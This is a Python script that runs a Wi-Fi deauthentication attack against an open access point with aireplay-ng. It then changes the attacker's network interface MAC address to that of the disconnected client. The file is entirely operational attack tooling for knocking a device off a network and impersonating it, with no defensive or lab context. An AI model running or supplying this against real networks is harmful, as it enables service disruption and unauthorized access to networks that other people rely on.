#! /usr/bin/env python
#! -*- coding: utf-8 -*-

#Author: Cristian Fonseca Comas
#Age: 17
#Date:may 4 of 2020
#Aka: Kuze

#This script execute deauth attack AP (OPEN) with filter MAC, and change MAC Address for a one client

#Import library
import subprocess
from colorama import Fore, Back, Style
import optparse
import re
import time
#Declaring the parser
def data_parse():
	parser = optparse.OptionParser()
	parser.add_option("-d","--moninterf",dest="moninterf",help="Interface monitor mode")
	parser.add_option("-p","--packets",dest="packets",help="Count of Packet to reply(Ex:-0 100)")
	parser.add_option("-a","--accesspoint",dest="accesspoint",help="Access Point selected for Attack")
	parser.add_option("-i","--interface",dest="interface",help="Interface to change its MAC Address")
	parser.add_option("-m","--new_mac",dest="new_mac",help="New MAC Address")
	(options, args) = parser.parse_args()
	if not options.interface:
		parser.error("[-] Please specify the interface, use --help for more info")
	elif not options.new_mac:
		parser.error("[-] Please specify the new MAC Address, use --help for more info")
	elif not options.accesspoint:
		parser.error("[-] Please specify the AP for Attack")
	elif not options.packets:
		parser.error("[-] Please specify the count packet's to reply")
	elif not options.moninterf:
		parser.error("[-] Please specify the monitor interface ")
	else:
		return options
#Execute Aireplay for Detauth Attack
def aireplay(packets, accesspoint, new_mac, moninterf):
	subprocess.call(["aireplay-ng","-0",packets,"-a",accesspoint,"-c",new_mac,moninterf ])
	print (Fore.GREEN+"[+] Packets send to "+new_mac+Style.RESET_ALL)
	time.sleep(5)
#Changing the MAC Address of accord with the parser
def mac_changer(interface,new_mac):
	#Interface DOWN
	subprocess.call(["ifconfig",interface,"down"])
	print(Fore.GREEN+"[+]"+" Changed "+interface+" status to DOWN"+Style.RESET_ALL)
	#Change the MAC
	subprocess.call(["ifconfig",interface,"hw","ether",new_mac])
	print(Fore.GREEN+"[+] Setting New MAC Address to "+interface+Style.RESET_ALL)
	#Interface UP
	subprocess.call(["ifconfig",interface,"up"])
	print(Fore.GREEN+"[+] Change "+interface+" status to UP"+Style.RESET_ALL)
#Check if the new MAC Address is establish
def current_mac(interface):
	ifconfig_result = subprocess.check_output(["ifconfig",interface])
	check = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",ifconfig_result)
	if check:
		return check.group(0)
	else:
		print(Fore.GREEN+"[-] Could Not Read MAC Address"+Style.RESET_ALL)
options = data_parse()
aireplay(options.packets,options.accesspoint,options.new_mac,options.moninterf)
current_macs = current_mac(options.interface)
print (Fore.GREEN+"[+] Current MAC is "+ str(current_macs)+Style.RESET_ALL)
mac_changer(options.interface,options.new_mac)
current_mac = current_mac(options.interface)
if current_mac == options.new_mac:
	print ("[+] New MAC Address for "+options.interface+" is "+Fore.GREEN +options.new_mac+Style.RESET_ALL)
else:
	print("[-] Error While Changing MAC Address")